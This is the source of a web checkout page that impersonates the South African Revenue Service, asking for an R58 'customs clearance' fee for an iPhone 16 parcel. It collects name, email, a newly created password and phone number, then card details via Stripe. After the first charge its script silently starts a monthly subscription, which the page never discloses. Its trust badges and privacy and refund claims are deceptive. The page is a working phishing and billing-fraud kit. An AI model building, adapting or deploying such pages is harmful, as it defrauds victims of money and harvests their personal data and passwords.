<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);} 
    gtag('js', new Date());
    gtag('config', 'G-FDQ6REQWS8');
  </script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Secure Payment • SARS-style Checkout</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet" />

  <style>
    :root{
      --bg:#ffffff; --card:#f8f9fc; --text:#111; --muted:#555; --line:#ddd; --cta1:#ffd76b; --cta2:#ffb429; --radius:16px;
    }
    *{box-sizing:border-box}
    body{
      margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif; 
      background:var(--bg); color:var(--text);
      display:flex; flex-direction:column; align-items:center; justify-content:flex-start;
      padding:18px 14px 40px;
    }
    .shell{ width:min(900px,100%); display:flex; flex-direction:column; gap:18px }
    .card{
      width:min(700px,100%); background:var(--card); border:1px solid var(--line);
      border-radius:var(--radius); padding:24px; box-shadow:0 8px 20px rgba(0,0,0,.05); margin-inline:auto;
    }
    .title{ font-size:28px; font-weight:900; text-align:center; margin:4px 0 14px }
    .sub{ text-align:center; color:var(--muted); margin-top:-6px; margin-bottom:16px }
    .img-wrap{ display:flex; justify-content:center; padding:10px 0 16px }
    .img-wrap img{ width:min(360px,80%); height:auto; border-radius:18px; border:1px solid #eee; }
    .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
    .input{ width:100%; padding:12px; border:1px solid #ccc; background:#fff; color:#111; border-radius:10px; font-size:16px; }
    .btn{
      width:100%; border:none; color:#111; border-radius:12px; padding:12px 16px;
      font-weight:900; cursor:pointer; font-size:16px; 
      background:linear-gradient(180deg,var(--cta1),var(--cta2));
      box-shadow:0 8px 18px rgba(255,174,15,.25);
    }
    .btn-row{ display:flex; gap:12px; margin-top:12px }
    .muted-btn{ background:#eee; color:#333; border:1px solid #ddd; }
    .step{ display:none }
    .step[aria-hidden="false"]{ display:block }
    .label{font-weight:700; margin:4px 0 8px; font-size:14px; color:#333}
    .el{ width:100%; background:#fff; color:#111; border:1px solid #ccc; border-radius:10px; padding:12px; }
    .brands{display:flex; justify-content:center; gap:12px; margin:14px 0 6px}
    .brands img{height:22px}
    .trust-text{ font-size:13px; color:#666; text-align:center; margin-top:12px }
    #err{ width:100%; margin-top:10px; font-size:14px; color:#b00020; background:#fde9eb; border:1px solid #e5b2b8; border-radius:10px; padding:8px; display:none; }
    #err[aria-hidden="false"]{ display:block; }
    .loading-overlay{ position:fixed; inset:0; background:rgba(255,255,255,.9); display:none; align-items:center; justify-content:center; flex-direction:column; z-index:9999; text-align:center; }
    .loading-overlay[aria-hidden="false"]{ display:flex }
    .loading-box{ width:min(92vw,460px); background:#fff; border:1px solid #ddd; border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.08); padding:20px; text-align:center; }
    .loading-title{ font-weight:800; margin:2px 0 10px; color:#111 }
    .progress-wrap{ width:100%; height:10px; background:#eee; border-radius:999px; overflow:hidden; }
    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg, var(--cta1), var(--cta2)); animation: loadingBar 2.2s ease-in-out infinite; }
    @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }

    /* Phone prefix + number layout */
    .phone-wrap{ display:grid; grid-template-columns:140px 1fr; gap:8px; }
    @media (max-width:520px){ .phone-wrap{ grid-template-columns:1fr; } }

    /* ====== SARS-look refresh ====== */
    :root{
      --sars-blue:#0B5E8E;         /* primary blue */
      --sars-blue-2:#0B6EA8;       /* lighter edge for gradients */
      --sars-dark:#2b2b2b;         /* dark top bar */
      --sars-white:#ffffff;
      --card:#ffffff;
      --line:#cfe0ea;
      --radius:18px;
    }

    /* Make the whole background SARS blue */
    html, body{ background: var(--sars-blue) !important; color: #0b2239; min-height:100%; }

    /* Top bar like the site header */
    .topbar{ background: var(--sars-dark); color:#fff; padding:12px 18px; font-weight:600; letter-spacing:.2px; }

    /* CHANGED: Hero strip is a SOLID blue (no lighter patch/gradient) */
    .sars-hero{ 
      background: var(--sars-blue) !important; /* solid */
      padding:28px 12px; display:flex; align-items:center; justify-content:center;
      box-shadow:none !important; /* remove inset highlight */
    }
    .sars-hero img{ height:64px; object-fit:contain; filter:none !important; }

    /* Main wrapper spacing so the card floats on the blue bg */
    main, .container, .page, .root{ max-width:960px; margin:24px auto 56px auto; padding:0 16px; }

    /* Card vibes */
    .card, .panel, .box, .checkout{ background: var(--card); border:1px solid var(--line) !important; border-radius: var(--radius); box-shadow: 0 12px 30px rgba(0,0,0,.12); }

    /* Headings & subtle sub copy */
    h1,h2,h3,.title{ color:#123b56 }
    .sub, .muted{ color:#3c5a6f }

    /* Inputs */
    input, select, textarea, .input, .el{
      background:#fff; border:1px solid #c7d8e4 !important; border-radius:12px !important; padding:12px 14px !important;
    }
    input:focus, select:focus, textarea:focus, .input:focus, .el:focus{ outline: none; border-color:#86b7d7 !important; box-shadow: 0 0 0 3px rgba(134,183,215,.35); }

    /* Primary button in SARS gradient */
    button, .btn, .pay{
      color:#fff !important; background: linear-gradient(180deg, var(--sars-blue-2), var(--sars-blue)) !important; border:0 !important; border-radius:14px !important; padding:12px 16px !important; font-weight:700 !important; box-shadow: 0 8px 22px rgba(11,110,168,.35); transition: transform .06s ease;
    }
    button:hover, .btn:hover, .pay:hover{ transform: translateY(-1px) }
    button:active, .btn:active, .pay:active{ transform: translateY(0) }

    .muted-btn{ background:#e7f1f7 !important; color:#0b2239 !important; border:1px solid #c7d8e4 !important; }

    .breadcrumbs{ color:#eaf3f9; font-size:14px; margin:8px auto -8px auto; max-width:960px; padding:0 16px; }
    .breadcrumbs a{ color:#ffffff; opacity:.9; text-decoration:none }
    .breadcrumbs span{ opacity:.8 }

    .loading-box .progress-bar{ background: linear-gradient(90deg, var(--sars-blue-2), var(--sars-blue)) !important; }

    .footer, footer{ color:#eaf3f9; text-align:center; padding:24px 16px; }
  </style>
</head>
<body>
  <div class="topbar">South African Revenue Service — Secure Checkout</div>
  <div class="sars-hero"><img src="sars.png" alt="SARS-styled Logo" /></div>
  <div class="breadcrumbs">Home  »  Customs and Excise  »  Goods Declaration</div>

  <!-- GoAffPro loader (keep this so the next page can track) -->
  <script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde" type="text/javascript"></script>

  <div class="shell">
    <!-- STEP 1 -->
    <section id="step1" class="card step" aria-hidden="false">
      <h1 class="title">Customs clearance for iPhone 16: <span id="priceHero" data-price> R58</span>!</h1>
      <p class="sub">After clearance Post Office will deliver your parcel.</p>
      <div class="img-wrap"><img src="ipn16.png" alt="iPhone 16 Plus" /></div>

      <div class="grid">
        <input id="nameInput" class="input" placeholder="Full name" autocomplete="name" required />
        <input id="emailInput" class="input" type="email" placeholder="you@example.com" autocomplete="email" required />
        <input id="passwordInput" class="input" type="password" placeholder="Create a password" autocomplete="new-password" required />

        <div class="phone-wrap">
          <!-- CHANGED: ZA-only prefix select -->
          <select id="phonePrefix" class="input" aria-label="Country calling code"></select>
          <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone number" autocomplete="tel-national" />
        </div>
      </div>

      <div class="btn-row"><button id="nextBtn" class="btn">Next step →</button></div>
      <p class="trust-text">We’ll never share your email. 100% privacy guaranteed.</p>
    </section>

    <!-- STEP 2 -->
    <section id="step2" class="card step" aria-hidden="true">
      <h2 class="title">Secure Payment</h2>
      <p class="sub">Your details are safe — powered by Stripe.</p>

      <div class="label">Street address</div>
      <input id="billingStreet" class="input" placeholder="Street address" autocomplete="address-line1" />

      <div class="grid" style="margin-top:10px">
        <div>
          <div class="label">City</div>
          <input id="billingCity" class="input" placeholder="City" autocomplete="address-level2" />
        </div>
        <div>
          <div class="label">Post Code</div>
          <input id="billingPostcode" class="input" placeholder="Post Code" autocomplete="postal-code" />
        </div>
      </div>

      <div class="label" style="margin-top:10px">Country</div>
      <!-- CHANGED: ZA-only country select -->
      <select id="billingCountry" class="input" autocomplete="country"></select>

      <div id="gpay-button" style="margin-top:8px"></div>

      <div class="label">Card number</div>
      <div id="card-number" class="el"></div>

      <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px">
        <div>
          <div class="label">Expiration</div>
          <div id="card-expiry" class="el"></div>
        </div>
        <div>
          <div class="label">CVC</div>
          <div id="card-cvc" class="el"></div>
        </div>
      </div>

      <div id="err" aria-hidden="true" role="alert"></div>

      <div class="btn-row">
        <button id="backBtn" class="btn muted-btn">← Back</button>
        <button id="payNow" class="btn">Pay <span id="priceButton" data-price>R58</span> Securely</button>
      </div>

      <div class="brands">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" />
        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard" />
        <img src="https://charmr.xyz/logos/amex.png" alt="Amex" />
        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay" />
      </div>
      <p class="trust-text">🔒 256-bit SSL Secured · Powered by Stripe · 30-Day Money Back Guarantee</p>
    </section>
  </div>

  <!-- Loading overlay -->
  <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
    <div class="loading-box">
      <div class="loading-title">Processing your payment…</div>
      <div class="progress-wrap"><div class="progress-bar"></div></div>
      <p class="sub">Please wait, this may take a few seconds.</p>
    </div>
  </div>

  <!-- Stripe.js -->
  <script src="https://js.stripe.com/v3"></script>
  <script>
    /* ---------- Step navigation ---------- */
    const API_BASE = (() => {
      if (location.protocol.startsWith('http')) return location.origin;
      return "http://localhost:10000";
    })();

    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const nameInput = document.getElementById('nameInput');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const phonePrefix = document.getElementById('phonePrefix');
    const phoneNumber = document.getElementById('phoneNumber');

    const billingStreet   = document.getElementById('billingStreet');
    const billingCity     = document.getElementById('billingCity');
    const billingPostcode = document.getElementById('billingPostcode');
    const billingCountry  = document.getElementById('billingCountry');

    async function ensureAccount(){
      const email=(emailInput.value||'').trim();
      const password=passwordInput.value||'';
      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
      const prefix=(phonePrefix?.value||'+27').trim();
      const phone = rawPhone ? `${prefix}${rawPhone}` : '';
      if(!email || !password) throw new Error("Please enter email and password.");
      const res=await fetch(`${API_BASE}/api/register`,{ method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({email,password,phone}) });
      if(res.status===201) return true;
      let data={}; try{ data=await res.json(); }catch{}
      if(res.status===400 && /exists/i.test(data?.error||"")) return true;
      throw new Error(data?.error||"Could not create account");
    }

    document.getElementById('nextBtn').onclick=async()=>{ 
      if(!nameInput.value||!emailInput.value||!passwordInput.value){alert("Please enter your details");return}
      try{ await ensureAccount(); }catch(e){ alert(e.message||"Problem creating your account. Please try again."); return; }
      localStorage.setItem("checkout_name",nameInput.value);
      localStorage.setItem("checkout_email",emailInput.value);
      step1.setAttribute("aria-hidden","true");
      step2.setAttribute("aria-hidden","false");
    };
    document.getElementById('backBtn').onclick=()=>{ step1.setAttribute("aria-hidden","false"); step2.setAttribute("aria-hidden","true"); };

    /* ---------- ZA-ONLY phone/country ---------- */
    // CHANGED: restrict calling codes to ZA only
    const CALLING_CODES = { ZA: { code: '+27', name: 'South Africa' } };

    function populateZAOnlyPrefix(selectEl){
      if(!selectEl) return;
      selectEl.innerHTML='';
      const data = CALLING_CODES.ZA;
      selectEl.append(new Option(`${data.code} — ${data.name}`, data.code, true, true));
      selectEl.value = data.code;
    }

    function populateZAOnlyCountry(selectEl){
      if(!selectEl) return;
      selectEl.innerHTML='';
      selectEl.append(new Option('South Africa', 'ZA', true, true));
      selectEl.value = 'ZA';
    }

    // Run immediately
    populateZAOnlyPrefix(phonePrefix);
    populateZAOnlyCountry(billingCountry);

    /* ---------- Currency/price label (still fixed to R) ---------- */
    (function setPrice(){
      function apply(){ document.querySelectorAll('[data-price]').forEach(el=>{ el.textContent = `R58`; }); }
      apply();
    })();

    /* ---------- PREFILL from URL (email & phone) ---------- */
    (function prefillFromQuery(){
      try{
        const qs = new URLSearchParams(location.search);
        const emailParam = qs.get('email') || qs.get('e') || qs.get('em') || qs.get('mail');
        if (emailParam && emailInput) emailInput.value = decodeURIComponent(emailParam).trim();

        const numberParam = qs.get('number') || qs.get('n');
        const phoneParam  = qs.get('phone')  || qs.get('tel')  || qs.get('p') || qs.get('msisdn');

        let desiredNumber = null;
        if (phoneParam) desiredNumber = ((''+phoneParam).replace(/[^\d]/g,''));
        if (numberParam) desiredNumber = ((''+numberParam).replace(/[^\d]/g,''));
        if (desiredNumber && phoneNumber) phoneNumber.value = desiredNumber;
        // Lock prefix to +27 regardless of query
        if (phonePrefix) phonePrefix.value = '+27';
      }catch{/* ignore */}
    })();

    /* ---------- Stripe logic ---------- */
    const SUBSCRIBE_URL="https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
    const PUBLISHABLE_KEY="pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
    const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";

    const stripe=Stripe(PUBLISHABLE_KEY),elements=stripe.elements();
    const cardNumber=elements.create("cardNumber"),cardExpiry=elements.create("cardExpiry"),cardCvc=elements.create("cardCvc");
    cardNumber.mount("#card-number"); cardExpiry.mount("#card-expiry"); cardCvc.mount("#card-cvc");

    const $err=document.getElementById("err"),overlay=document.getElementById("loading-overlay");
    function showError(m){$err.textContent=m;$err.style.display="block"}
    function hideError(){$err.textContent="";$err.style.display="none"}
    function showLoading(){overlay.setAttribute("aria-hidden","false")}
    function hideLoading(){overlay.setAttribute("aria-hidden","true")}

    document.getElementById("payNow").onclick=async()=>{
      hideError();showLoading();
      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
      const prefix=(phonePrefix?.value||'+27').trim();
      const fullPhone = rawPhone ? `${prefix}${rawPhone}` : undefined;

      const addr = {
        line1: (billingStreet?.value || '').trim() || undefined,
        city: (billingCity?.value || '').trim() || undefined,
        postal_code: (billingPostcode?.value || '').trim() || undefined,
        country: 'ZA', // CHANGED: force ZA
      };

      const pm=await stripe.createPaymentMethod({
        type:"card",
        card:cardNumber,
        billing_details:{ name:nameInput.value || undefined, email:emailInput.value || undefined, phone: fullPhone, address: addr }
      });

      if(pm.error){hideLoading();showError(pm.error.message);return}

      try{
        const res=await fetch(SUBSCRIBE_URL,{ method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ paymentMethodId:pm.paymentMethod.id, name:nameInput.value, email:emailInput.value, phone: fullPhone, address: addr }) });
        const data=await res.json();
        if(data.error){hideLoading();showError(data.error);return}
        if(!data.clientSecret){hideLoading();showError("Payment failed");return}

        const conf=await stripe.confirmCardPayment(data.clientSecret);
        if(conf.error){hideLoading();showError(conf.error.message);return}
        if(!(conf.paymentIntent&&conf.paymentIntent.status==="succeeded")){hideLoading();showError("Payment not completed");return}

        const subRes = await fetch("https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial",{ method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ paymentIntentId: data.paymentIntentId, priceIdMonthly: MONTHLY_PRICE_ID }) });
        const subData = await subRes.json();
        if(subData.error){hideLoading();showError(subData.error);return}

        (function(){
          const A = 'thankyou-iphone.html';
          const B = 'thankyou-iphone-skip.html';
          const pid = (conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
          function fnv1a32(str){ let h = 0x811c9dc5 >>> 0; for (let i = 0; i < str.length; i++){ h ^= str.charCodeAt(i); h = Math.imul(h, 0x01000193) >>> 0; } return h >>> 0; }
          function cryptoRandInt(max){ try{ const u32 = new Uint32Array(1); crypto.getRandomValues(u32); return Number(u32[0] % BigInt(max)); }catch{ return Math.floor(Math.random()*max); } }
          const bucket = pid ? (fnv1a32(pid) % 100) : cryptoRandInt(100);
          const goSkip = bucket < 60;
          const qb = pid ? ('?v=' + encodeURIComponent(pid)) : ('?t=' + Date.now());
          window.location.href = (goSkip ? B : A) + qb;
        })();
      }catch(e){ hideLoading(); showError(e.message||"Something went wrong"); }
    };
  </script>
</body>
</html>
